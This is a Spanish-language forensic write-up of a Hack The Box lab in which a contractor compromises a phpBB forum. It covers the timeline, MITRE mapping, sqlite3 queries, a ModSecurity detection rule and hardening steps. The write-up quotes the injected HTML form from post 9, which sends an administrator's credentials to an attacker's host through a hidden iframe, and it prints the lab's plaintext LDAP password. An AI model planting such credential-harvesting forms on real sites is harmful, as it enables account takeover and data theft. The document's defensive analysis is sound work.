### [HTB-BUMBLEBEE: LINUX WEB APPLICATION & DATABASE EXTRUSION]

**Clasificación:** TLP:AMBER  
**Entorno / Plataforma:** Linux Web Server / Apache Access Logs & SQLite3 Database / HTB Sherlock  
**Objetivo:** Servidor del Foro Interno de Forela (phpBB)

#### 1. Escenario, Contexto e Identificación del Incidente

- **Resumen Ejecutivo:** Se investigó una fuga de información crítica y toma de control administrativa en el foro interno de la organización (phpBB). Un contratista externo conectó su equipo a la red Wi-Fi de invitados (Guest Wi-Fi) y registró una cuenta de usuario (apoole1) desde la dirección IP **10.10.0.78**. Utilizando capacidades del motor de foros, el atacante publicó un hilo conteniendo un vector de robo de credenciales mediante un formulario embebido en un iframe oculto. Cuando el administrador del sistema visitó la publicación, sus credenciales fueron enviadas a un script controlado por el atacante (http://10.10.0.78/update.php). Con estas credenciales, el contratista tomó control de la cuenta de administración, se auto-promovió al grupo Administrators, extrajo credenciales en texto plano del directorio LDAP (Passw0rd1) y generó y descargó una copia de seguridad completa de la base de datos de la organización.
    
- **Fuentes de Telemetría y Evidencias:**
    
    - access.log: Registro de peticiones HTTP del servidor web Apache.
        
    - phpbb.sqlite3: Base de datos de la aplicación analizada mediante el CLI de sqlite3 (tablas phpbb_users, phpbb_posts, phpbb_log, phpbb_config).
        

#### 2. Mapeo Táctico MITRE ATT&CK®

|   |   |   |   |
|---|---|---|---|
|Táctica|ID Técnica / Subtécnica|Nombre de Técnica|Evidencia Específica Hallada|
|**Credential Access**|T1185|Browser Session Hijacking / Stored Harvesting|Inyección de formulario oculto en post ID 9 para recolectar credenciales administrativas en update.php.|
|**Privilege Escalation**|T1078.003|Valid Accounts: Local Accounts|Uso de credenciales robadas para autenticarse como administrador (Event ID LOG_ADMIN_AUTH_SUCCESS).|
|**Persistence**|T1098|Account Manipulation|Adición del usuario apoole1 al grupo Administrators a las 2023-04-26 10:53:51 UTC.|
|**Exfiltration**|T1567|Exfiltration Over Web Service|Descarga de la copia de seguridad de la base de datos backup_1682506471_dcsr71p7fyijoyq8.sql.gz.|

#### 3. Cadena de Infección y Análisis Forense Detallado

- **Nombre de Usuario del Contratista:** **apoole1** (User ID 52).
    
- **Dirección IP de Registro y Ataque:** **10.10.0.78**.
    
- **Timestamp de Registro (UTC):** **2023-04-25 12:15:41 UTC**.
    

El contratista publicó un mensaje en el foro a las **2023-04-25 12:17:22 UTC**:

- **Post ID Malicioso:** **9** (Topic ID 2, Foro 2).
    
- **Payload Inyectado:** El contenido HTML de la publicación incluía un formulario trampa:
    
    
    
    ``` HTML
    <form action="http://10.10.0.78/update.php" method="post" id="login" data-focus="username" target="hiddenframe">
    ```
    
- **URI de Exfiltración:** **http://10.10.0.78/update.php** (destinada a interceptar silenciosamente las credenciales enviadas por el navegador del administrador mediante un iframe oculto).
    
- **Interacción de la Víctima:** A las **2023-04-25 12:17:48 UTC** (registrado en Apache como 13:17:48 +0100), el administrador (10.255.254.2) visitó el post viewtopic.php?f=2&t=2, comprometiendo sus credenciales.
    
- **User-Agent del Administrador Comprometido:**  
    Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
    

1. **Inicio de Sesión del Contratista como Administrador:**
    
    - A las **2023-04-26 10:53:12 UTC**, el atacante se autenticó exitosamente en el panel administrativo (LOG_ADMIN_AUTH_SUCCESS en phpbb_log) desde la IP 10.10.0.78.
        
2. **Auto-Promoción a Administrador:**
    
    - A las **2023-04-26 10:53:51 UTC**, el usuario apoole1 fue agregado al grupo administrativo:
        
    - Registro en base de datos: LOG_USERS_ADDED: Administrators, apoole.
        
3. **Exposición de Credenciales LDAP en Texto Plano:**
    
    - La inspección de la tabla phpbb_config reveló la configuración del servicio de directorio:
        
    - Servidor: 10.10.0.11 | Usuario: CN=phpbb-admin,OU=Service,OU=Forela,DC=forela,DC=local
        
    - **Contraseña LDAP en Texto Plano:** **Passw0rd1**.
        
4. **Generación y Descarga del Backup:**
    
    - A las 10:54:30 UTC, el atacante solicitó la creación del backup de la base de datos vía POST al panel acp_database.
        
    - A las **2023-04-26 11:01:38 UTC** (registrado en logs como 12:01:38 +0100), el atacante descargó el archivo:
        
        
        
        ``` TEXT
        GET /store/backup_1682506471_dcsr71p7fyijoyq8.sql.gz HTTP/1.1
        ```
        
    - **Tamaño de la Copia de Seguridad:** **34707 bytes** (Código de respuesta 200).
        



``` bash
# Consultas SQL aplicadas sobre la base de datos sqlite3
sqlite3 phpbb.sqlite3 "SELECT post_id, poster_ip, datetime(post_time, 'unixepoch'), post_text FROM phpbb_posts WHERE post_id=9;"
sqlite3 phpbb.sqlite3 "SELECT datetime(log_time, 'unixepoch'), log_ip, log_operation, log_data FROM phpbb_log WHERE log_ip='10.10.0.78';"
sqlite3 phpbb.sqlite3 "SELECT config_name, config_value FROM phpbb_config WHERE config_name='ldap_password';"
```

#### 4. Reglas de Detección e Ingeniería de Seguridad

codeSecrules

``` Secrules
SecRule REQUEST_URI "@contains /posting.php" \
    "id:1000931,phase:2,deny,status:403,log,msg:'ALERTA CTI: Intento de inyeccion de formulario externo en foro',chain"
    SecRule REQUEST_BODY "@rx (?i)<form[^>]+action=[\"']?https?://(?!(?:www\.)?forela\.local)"
```


``` SPL
index=access_logs uri_path="*/store/backup_*" status=200
| table _time, clientip, method, uri_path, bytes, useragent
```

#### 5. Plan de Contención, Erradicación y Hardening

1. **Aislamiento en Wi-Fi de Invitados:** Desconectar y banear la dirección MAC asociada a la IP 10.10.0.78 en la controladora inalámbrica.
    
2. **Depuración del Foro:** Purgar el post ID 9 y eliminar los archivos de respaldo almacenados en el directorio expuesto /store/.
    
3. **Revocación de Credenciales de Dominio:** Dado que la contraseña del usuario de servicio LDAP (Passw0rd1) fue extraída en texto plano, resetear de inmediato la cuenta CN=phpbb-admin en Active Directory.
    

4. **Restricción de Acceso al Directorio /store/:** Bloquear el acceso HTTP directo mediante configuración de Apache (Require all denied en la carpeta /store/).
    
5. **Segregación Estricta de Red de Invitados:** Aislar completamente la red Wi-Fi de invitados impidiendo cualquier tipo de enrutamiento hacia servidores de aplicaciones internas o paneles administrativos.
    
6. **Implementación de Content Security Policy (CSP):** Configurar directivas HTTP CSP (form-action 'self') que impidan a los navegadores enviar formularios hacia dominios o IPs externas.